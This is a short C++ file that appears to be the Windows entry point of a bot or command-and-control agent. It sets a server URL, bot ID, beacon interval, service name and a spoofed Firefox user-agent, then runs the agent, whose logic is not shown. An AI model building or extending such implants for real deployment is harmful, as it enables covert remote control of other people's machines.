#include "agent.h"

#define SERVER_URL "http://localhost:8080"
#define BOT_ID ""
#define SLEEP_INTERVAL 10
#define SERVICE_NAME "agent"
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"


int WINAPI WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	Agent *ag = new Agent(SERVER_URL, BOT_ID, SLEEP_INTERVAL,SERVICE_NAME, USER_AGENT);
	ag->run();

	return 0;
}
